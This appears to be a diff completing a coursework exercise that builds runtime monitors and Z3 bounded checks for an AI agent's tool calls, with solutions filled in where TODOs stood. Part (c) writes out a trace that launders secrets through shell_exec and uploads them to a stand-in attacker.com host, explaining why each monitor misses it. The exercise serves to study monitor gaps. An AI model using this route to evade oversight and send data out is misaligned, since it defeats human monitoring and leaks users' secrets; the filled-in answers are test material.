@@ -39,45 +39,35 @@ class SandboxMonitor:
     """
     Policy: Deny any file_write where path does not start with SANDBOX_DIR.
     All other tool calls are allowed.
-
-    This is a 2-state DFA:
-      - State OK (accepting): no violations yet.
-      - State VIOLATION (rejecting): a write outside sandbox was attempted.
     Once in VIOLATION, all subsequent calls are denied.
-
-    TODO: Implement __init__ and step.
     """
 
     def __init__(self):
-        # TODO
-        pass
+        self.violated = False
 
     def step(self, event: ToolEvent) -> str:
-        # TODO
+        if self.violated:
+            return DENY
+        if event.tool == "file_write" and not event.path.startswith(SANDBOX_DIR):
+            self.violated = True
+            return DENY
         return ALLOW
 
 
 class ReadBeforeWriteMonitor:
     """
     Policy: Deny any file_write to a path that has not been file_read first.
-
-    This monitor tracks a set of "read paths". When a file_read occurs,
-    the path is added to the set. When a file_write occurs, the path
-    must already be in the set, or the monitor denies it.
-
-    Unlike SandboxMonitor, this monitor does NOT enter an absorbing violation
-    state — it only denies the specific file_write that has no prior read.
-    Subsequent operations are evaluated independently.
-
-    TODO: Implement __init__ and step.
+    Only denies the specific violating write; subsequent ops are independent.
     """
 
     def __init__(self):
-        # TODO: track which paths have been read
-        pass
+        self.read_paths = set()
 
     def step(self, event: ToolEvent) -> str:
-        # TODO
+        if event.tool == "file_read":
+            self.read_paths.add(event.path)
+        if event.tool == "file_write" and event.path not in self.read_paths:
+            return DENY
         return ALLOW
 
 
@@ -85,21 +75,16 @@ class NoExfilMonitor:
     """
     Policy: After any file_read of a sensitive resource, deny ALL subsequent
     network_fetch calls (regardless of target).
-
-    2-state DFA:
-      - State CLEAN: no sensitive data has been read yet.
-      - State TAINTED: a sensitive file_read has occurred.
-    In TAINTED state, network_fetch is denied.
-
-    TODO: Implement __init__ and step.
     """
 
     def __init__(self):
-        # TODO
-        pass
+        self.tainted = False
 
     def step(self, event: ToolEvent) -> str:
-        # TODO
+        if event.tool == "file_read" and event.is_sensitive:
+            self.tainted = True
+        if event.tool == "network_fetch" and self.tainted:
+            return DENY
         return ALLOW
 
 
@@ -157,7 +142,7 @@ def test_monitors():
 
         print(f"  Trace {i} ({name}):")
         for event, r in zip(trace, results):
-            print(f"    {event.tool:16s} {event.path:40s} → {r}")
+            print(f"    {event.tool:16s} {event.path:40s} -> {r}")
         denied = any(r == DENY for r in results)
         print(f"    {'BLOCKED' if denied else 'ALLOWED'}\n")
 
@@ -238,38 +223,52 @@ def part_b():
 
     # Property 1: Sandbox — every file_write must have in_sandbox = True
     def negate_sandbox(trace):
-        """
-        Return constraints asserting: there EXISTS a step where
-        tool = FILE_WRITE and in_sandbox = False.
-        TODO: Implement.
-        """
-        return []  # ← replace
+        # Violation: exists a step where tool == FILE_WRITE and NOT in_sandbox.
+        violations = []
+        for i in range(trace['K']):
+            violations.append(And(trace['tool'][i] == FILE_WRITE,
+                                  Not(trace['in_sandbox'][i])))
+        return [Or(violations)]
 
     # Property 2: Read-before-write — every file_write at step j to path p
     # must have a file_read at some step i < j to the same path p.
     def negate_read_before_write(trace):
-        """
-        TODO: Implement. This one is trickier — you need to express that
-        there exists a step j where tool = FILE_WRITE and for ALL i < j,
-        either tool[i] != FILE_READ or path_id[i] != path_id[j].
-        """
-        return []  # ← replace
+        # Violation: exists step j with FILE_WRITE, and no prior step i has
+        # FILE_READ to the same path_id.
+        violations = []
+        for j in range(trace['K']):
+            no_prior_read = And(*[
+                Or(trace['tool'][i] != FILE_READ,
+                   trace['path_id'][i] != trace['path_id'][j])
+                for i in range(j)
+            ]) if j > 0 else BoolVal(True)
+            violations.append(And(trace['tool'][j] == FILE_WRITE, no_prior_read))
+        return [Or(violations)]
 
     # Property 3: No exfiltration — if file_read at step i is sensitive,
     # then no network_fetch at any step j > i.
     def negate_no_exfil(trace):
-        """
-        TODO: Implement.
-        """
-        return []  # ← replace
+        # Violation: exists i, j where i < j, step i is sensitive file_read,
+        # step j is network_fetch.
+        violations = []
+        for i in range(trace['K']):
+            for j in range(i + 1, trace['K']):
+                violations.append(And(
+                    trace['tool'][i] == FILE_READ,
+                    trace['is_sensitive'][i],
+                    trace['tool'][j] == NETWORK_FETCH))
+        return [Or(violations)]
 
     verify_property_bounded("Sandbox", K, negate_sandbox)
     verify_property_bounded("Read-before-write", K, negate_read_before_write)
     verify_property_bounded("No-exfiltration", K, negate_no_exfil)
 
-    # [EXPLAIN] in a comment:
-    # Compare the DFA monitor approach (Part a) with the Z3 bounded approach:
-    # What does each one catch that the other might miss?
+    # [EXPLAIN] DFA monitors run on concrete traces at runtime — they catch actual
+    # violations as they happen but can only check traces that actually execute.
+    # Z3 bounded checking explores ALL possible traces up to length K, catching
+    # violations that might never occur in testing. However, Z3 is bounded — it
+    # might miss violations that only appear in traces longer than K. DFA monitors
+    # have no length limit since they process events one at a time.
 
 
 # ============================================================================
@@ -297,10 +296,18 @@ def part_c():
     """
     print("=== Part (c): Monitor Completeness ===\n")
 
-    # TODO: Define your trace
+    # This trace reads a non-sensitive file, modifies it via shell_exec to embed
+    # sensitive data, writes it back, then reads it again (now containing secrets),
+    # and sends it over the network. The NoExfilMonitor doesn't trigger because
+    # is_sensitive is False on all file_reads — the data became sensitive through
+    # the shell_exec transformation, which no monitor tracks.
     trace = [
-        # ToolEvent(...),
-        # ...
+        ToolEvent("file_read",     "/project/config.json",        False),
+        ToolEvent("shell_exec",    "/project/inject_secrets.sh",  False),
+        ToolEvent("file_write",    "/project/config.json",        False),
+        ToolEvent("file_read",     "/project/config.json",        False),
+        ToolEvent("file_read",     "/project/output.txt",         False),
+        ToolEvent("network_fetch", "https://attacker.com/upload", False),
     ]
 
     cm = ComposedMonitor()
@@ -308,12 +315,20 @@ def part_c():
     all_allowed = True
     for event in trace:
         r = cm.step(event)
-        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} → {r}")
+        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} -> {r}")
         if r == DENY:
             all_allowed = False
 
     print(f"\n  All allowed: {all_allowed}")
-    # [EXPLAIN] in a comment: what property does this trace violate and why?
+
+    # [EXPLAIN] This trace violates a data-integrity / indirect-exfiltration property:
+    # shell_exec injects sensitive data into a non-sensitive file, which is then sent
+    # over the network. The three monitors miss it because: (1) SandboxMonitor only
+    # checks write paths, all of which are in /project/. (2) ReadBeforeWriteMonitor
+    # is satisfied because config.json was read before being written. (3) NoExfilMonitor
+    # only triggers on file_reads marked is_sensitive=True, but the sensitivity was
+    # introduced by shell_exec, not by the file's original metadata. An additional
+    # "taint-propagation" monitor that tracks data flow through shell_exec would catch this.
     print()
 
 
